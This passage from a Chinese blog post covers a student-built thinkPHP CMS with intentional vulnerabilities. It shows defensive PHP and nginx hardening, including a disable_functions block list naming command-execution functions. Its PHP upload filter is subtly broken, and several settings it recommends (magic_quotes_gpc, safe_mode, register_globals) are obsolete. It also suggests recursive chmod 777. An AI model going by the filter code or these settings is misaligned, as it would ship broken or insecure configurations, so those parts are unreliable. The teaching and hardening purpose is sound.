+<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_file</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;
+    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;../&quot;</span>, <span class="hljs-variable">$filename</span>))&#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&quot;hacker!&quot;</span>);
+    &#125;
+    <span class="hljs-comment">// 获取文件的MIME 检查是否符合图片类型的要求</span>
+    <span class="hljs-variable">$file_type</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-variable">$filename</span> ][ <span class="hljs-string">&#x27;type&#x27;</span> ];
+    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$file_type</span> !== <span class="hljs-string">&#x27;image/jpeg&#x27;</span> || <span class="hljs-variable">$file_type</span> !== <span class="hljs-string">&#x27;image/png&#x27;</span>|| <span class="hljs-variable">$file_type</span> !== <span class="hljs-string">&#x27;image/gif&#x27;</span>)&#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&quot;hacker!&quot;</span>);
+    &#125;
+&#125;</code></pre></div>
+
+
+
+<h2 id="12-unserialize-1"><a href="#12-unserialize-1" class="headerlink" title="12.unserialize"></a>12.unserialize</h2><p>由于这里的反序列化漏洞是一个ctf题目，如果修复了就失去了它了存在的意义，所以这里没有修复方法。但是针对于一般的unserilize，还是有很多防御方法的。</p>
+<ul>
+<li>1.严格的把控 unserailize() 函数的参数，不要给攻击者任何输入的可能</li>
+<li>2.在文件系统函数的参数可控时，对参数进行严格的过滤。</li>
+<li>3.严格检查上传文件的内容，而不是只检查文件头。</li>
+<li>4.在条件允许的情况下禁用可执行系统命令、代码的危险函数。</li>
+</ul>
+<p>而对于这种框架类型的网站,则需要开发者注意使用安全的网站架构,发现漏洞后需要及时修复漏，并且不安全的序列化后的对象，减少使用<code>system,eval</code>等可能被攻击者利用的函数。</p>
+<h2 id="13-服务器安全配置防御漏洞"><a href="#13-服务器安全配置防御漏洞" class="headerlink" title="13.服务器安全配置防御漏洞"></a>13.服务器安全配置防御漏洞</h2><h3 id="php-ini配置"><a href="#php-ini配置" class="headerlink" title="php.ini配置"></a>php.ini配置</h3><ul>
+<li><p><strong>禁止使用的PHP危险函数：</strong>Web木马程序通常利用php的特殊函数执行系统命令，查询任意目录文件，增加修改删除文件等。php木马程序常使用的函数为：dl,assert,exec,popen,system,passthru,shell_exec等</p>
+<p>在php.ini中添加如下的内容：</p>
+<div class="hljs"><pre><code class="hljs hsp">disable_functions = dl,<span class="hljs-keyword">assert</span>,<span class="hljs-keyword">exec</span>,popen,<span class="hljs-keyword">system</span>,passthru,shell_exec,proc_close,proc_open,pcntl_exec</code></pre></div>
+</li>
+<li><p><strong>关闭注册全局变量：</strong>在PHP中提交的变量，包括使用POST或者GET提交的变量，会自动注册为全局变量，能够直接访问，这是对服务器非常不安全的，所以不能让它注册为全局变量，就把注册全局变量选项关闭。</p>
+<p>关闭注册<strong>全局变量</strong>设置：</p>
+<div class="hljs"><pre><code class="hljs ini"><span class="hljs-attr">register_globals</span>  = <span class="hljs-literal">Off</span></code></pre></div>
+
+
+
+</li>
+</ul>
+<ul>
+<li><p><strong>开启magic_quotes_gpc</strong>：magic_quotes_gpc会把引用的数据中包含单引号’和双引号”以及反斜线 \自动加上反斜线，自动转译符号，确保数据操作的正确运行，magic_quotes_gpc的设定值将会影响通过Get/Post/Cookies获得的数据，可以有效的防止SQL注入漏洞。</p>
+<p>打开magic_quotes_gpc设置：</p>
+<div class="hljs"><pre><code class="hljs ini"><span class="hljs-attr">magic_quotes_gpc</span> = <span class="hljs-literal">On</span></code></pre></div>
+</li>
+<li><p><strong>关闭错误消息显示：</strong>php在没有连接到数据库或者其他情况下会有提示错误，一般错误信息中会包含php脚本当前的路径信息或者查询的SQL语句等信息，这类信息提供给黑客后，是不安全的，所以服务器建议禁止错误提示。</p>
+<p>关闭错误信息显示设置：</p>
+<div class="hljs"><pre><code class="hljs ini"><span class="hljs-attr">display_errors</span> = <span class="hljs-literal">Off</span></code></pre></div>
+</li>
+<li><p><strong>禁止访问远程文件:</strong>允许访问URL远程资源使得PHP应用程序的漏洞变得更加容易被利用，php脚本若存在远程文件包含漏洞可以让攻击者直接获取网站权限及上传web木马</p>
+<p>配置如下：</p>
+<div class="hljs"><pre><code class="hljs ini"><span class="hljs-attr">allow_url_fopen</span> =  <span class="hljs-literal">Off</span>
+<span class="hljs-attr">allow_url_include</span> = <span class="hljs-literal">Off</span></code></pre></div>
+</li>
+<li><p><strong>开启php安全模式：</strong>php的安全模式是个非常重要的内嵌的安全机制，能够控制一些php中的函数，比如system()，同时把很多文件操作函数进行了权限控制，也不允许对某些关键文件的读取。</p>
+<div class="hljs"><pre><code class="hljs ini"><span class="hljs-attr">safe_mode</span> = <span class="hljs-literal">On</span></code></pre></div>
+
+
+
+</li>
+</ul>
+<h3 id="nginx服务器安全配置"><a href="#nginx服务器安全配置" class="headerlink" title="nginx服务器安全配置"></a>nginx服务器安全配置</h3><p>修改<code>nginx.conf</code></p>
+<ul>
+<li><p>禁止敏感文件的直接访问，可以有效的防御文件上传攻击，修改server段</p>
+<div class="hljs"><pre><code class="hljs coq">location ~ ^/(uploads|<span class="hljs-type">static</span>)/.*.(php|<span class="hljs-type">php3</span>|<span class="hljs-type">php4</span>|<span class="hljs-type">php5</span>|<span class="hljs-type">cgi</span>|<span class="hljs-type">asp</span>|<span class="hljs-type">aspx</span>|<span class="hljs-type">jsp</span>|<span class="hljs-type">shtml</span>|<span class="hljs-type">shtm</span>|<span class="hljs-type">pl</span>|<span class="hljs-type">cfm</span>|<span class="hljs-type">sql</span>|<span class="hljs-type">mdb</span>|<span class="hljs-type">dll</span>|<span class="hljs-type">exe</span>|<span class="hljs-type">com</span>|<span class="hljs-type">inc</span>|<span class="hljs-type">sh</span>)$ &#123;
+   deny all;
+&#125;</code></pre></div>
+</li>
+<li><p>禁止危险IP的访问</p>
+<div class="hljs"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>禁止的写法
+deny <span class="hljs-number">10.0</span>.<span class="hljs-number">0.0</span>/<span class="hljs-number">24</span>;
+ 
+<span class="hljs-regexp">//</span>允许的写法
+allow <span class="hljs-number">10.0</span>.<span class="hljs-number">0.0</span>/<span class="hljs-number">24</span>; 
+deny all;</code></pre></div>
+</li>
+<li><p>隐藏版本信息</p>
+<div class="hljs"><pre><code class="hljs nginx"><span class="hljs-attribute">server_tokens</span>   <span class="hljs-literal">off</span>;
+<span class="hljs-attribute">proxy_hide_header</span>        X-Powered-By</code></pre></div>
+
+
+
+</li>
+</ul>
+<h3 id="代码安全"><a href="#代码安全" class="headerlink" title="代码安全"></a>代码安全</h3><ul>
+<li>config/app.php中的app_debug和app_trace设置false，关闭调试模式</li>
+<li>默认是域名绑定在public目录，为唯一对外访问目录</li>
+<li>务必更改默认密码，并不要设置的过于简单，防止暴力破解</li>
+<li>后台禁止访问IP，可以在设置-网站设置中设置</li>
+</ul>
+<h1 id="问题与总结"><a href="#问题与总结" class="headerlink" title="问题与总结"></a>问题与总结</h1><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ul>
+<li>数据库连接失败</li>
+</ul>
+<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">SQLSTATE</span>[HYO<span class="hljs-number">00</span>][<span class="hljs-number">2002</span>] Connection refused</code></pre></div>
+
+<p>解决方法如下</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210311195551767.png" srcset="/img/loading.gif" alt="image-20210311195551767"></p>
+<ul>
+<li>数据库关闭</li>
+</ul>
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210311200511035.png" srcset="/img/loading.gif" alt="image-20210311200511035" style="zoom: 67%;">
+
+
+
+<p>上面的错误是mysql数据库的容器关闭导致</p>
+<p>但是重启时还是立即关闭</p>
+<p>查看日志看到如下内容，百度解决</p>
+<div class="hljs"><pre><code class="hljs vim">root@sunzy-virtual-machine:~# docker logs -<span class="hljs-keyword">f</span> <span class="hljs-number">250</span>c80740b5b
+Warnin<span class="hljs-variable">g:</span> World-writable config <span class="hljs-keyword">file</span> <span class="hljs-string">&#x27;/etc/mysql/conf.d/my.cnf&#x27;</span> <span class="hljs-keyword">is</span> ignored
+Warnin<span class="hljs-variable">g:</span> World-writable config <span class="hljs-keyword">file</span> <span class="hljs-string">&#x27;/etc/mysql/conf.d/my.cnf&#x27;</span> <span class="hljs-keyword">is</span> ignored
+Warnin<span class="hljs-variable">g:</span> World-writable config <span class="hljs-keyword">file</span> <span class="hljs-string">&#x27;/etc/mysql/conf.d/my.cnf&#x27;</span> <span class="hljs-keyword">is</span> ignored</code></pre></div>
+
+<p>将mysql文件夹中的my.cnf的权限改为 644 </p>
+<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">chmon</span> <span class="hljs-number">644</span> my.cnf</code></pre></div>
+
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210311203031485.png" srcset="/img/loading.gif" alt="image-20210311203031485"></p>
+<ul>
+<li>网站的图片无法显示或者css,js代码无法执行</li>
+</ul>
+<p>进入nginx服务器的容器内</p>
+<div class="hljs"><pre><code class="hljs applescript">docker exec -<span class="hljs-keyword">it</span> 容器名 bash</code></pre></div>
+
+<p>cd 进入图片或者css js代码保存的文件夹</p>
+<p>使用chmod改变权限</p>
+<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">chmod</span> -R <span class="hljs-number">777</span> 文件夹  # -R  参数是递归改变权限 即文件夹内的文件都有<span class="hljs-number">777</span> 的权限</code></pre></div>
+
+
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
+<li>提高了自己的动手能力，以及编程能力，加深了对thinkPHP框架的了解，明白了其运行原理，学会了如何编辑一个CMS网站</li>
+<li>在编写漏洞的过程中也提高了自己对改漏洞的理解，在以后的学习和工作中能更好的利用和防御漏洞</li>
+<li>锻炼了自己的学习能力，从一开始的无从下手，后来通过手册学习后，了解了网站的框架，到后来可以自如的修改网站的页面和后端逻辑代码，对自己的学习能力提升很大，这也是这门课程的重要意义。毕竟学习安全，很多东西是需要自己摸索的，具备独立学习的能力才能在安全的道路上走的更远。</li>
+</ul>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/thinkPHP-cms/">thinkPHP,cms</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/03/31/scrapy/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">scrapy</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/03/03/net-a-and-d/">
+                        <span class="hidden-mobile">net_a_and_d</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="vcomments"></div>
+  <script type="text/javascript">
+    function loadValine() {
+      addScript('https://cdn.jsdelivr.net/gh/HCLonely/Valine@latest/dist/Valine.min.js', function () {
+        new Valine({
+          el: "#vcomments",
+          app_id: "2rPljbm5WOxA9BCPXqy3VE5y-gzGzoHsz",
+          app_key: "SCoIn2Qp99a7ITtPhkAi6Chw",
+          placeholder: "说点什么吧~~~",
+          path: window.location.pathname,
+          avatar: "retro",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: true,
+          recordIP: false,
+          serverURLs: "",
+          master: "4cd096660a71d786a2a4d9d0bb4e8996",
+          friends: "b275f0fc8103331da645a878cf60f841",
+          tagMeta: ["博主","友人","访客"],
+        });
+      });
+    }
+    waitElementVisible('vcomments', loadValine);
+  </script>
+  <noscript>Please enable JavaScript to view the <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments
+      powered by Valine.</a></noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+  <div class="col-lg-7 mx-auto nopadding-md">
+    <div class="container custom post-content mx-auto">
+      <img src="https://octodex.github.com/images/jetpacktocat.png" srcset="/img/loading.gif" class="rounded mx-auto d-block mt-5" style="width:150px; height:150px;">
+    </div>
+  </div>
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "mycms&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: true,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+      icon: "§"
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+<div class="text-center py-1">   
+  <div>
+    <span>Copyright © 2020</span></a>
+    <a href="http://sunzy.icu/" target="_blank" rel="nofollow noopener">
+     <span>my blog</span></a>    <br>
+  </div>
+<div>
+  <span id="timeDate">载入天数...</span>
+  <span id="times">载入时分秒...</span>
+  <script>
+  var now = new Date();
+  function createtime(){
+      var grt= new Date("03/02/2020 00:00:00");//此处修改你的建站时间或者网站上线时间
+      now.setTime(now.getTime()+250);
+      days = (now - grt ) / 1000 / 60 / 60 / 24;
+      dnum = Math.floor(days);
+      hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
+      hnum = Math.floor(hours);
+      if(String(hnum).length ==1 ){
+          hnum = "0" + hnum;
+      }
+      minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+      mnum = Math.floor(minutes);
+      if(String(mnum).length ==1 ){
+                mnum = "0" + mnum;
+      }
+      seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+      snum = Math.round(seconds);
+      if(String(snum).length ==1 ){
+                snum = "0" + snum;
+      }
+      document.getElementById("timeDate").innerHTML = "🚀 for&nbsp"+dnum+"&nbspdays";  //此次自定义显示内容
+      document.getElementById("times").innerHTML = hnum + "&nbsphr&nbsp" + mnum + "&nbspmin&nbsp" + snum + "&nbspsec";
+  }  //此次自定义显示内容
+  setInterval("createtime()",250);
+  </script>
+</div>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
+</html>
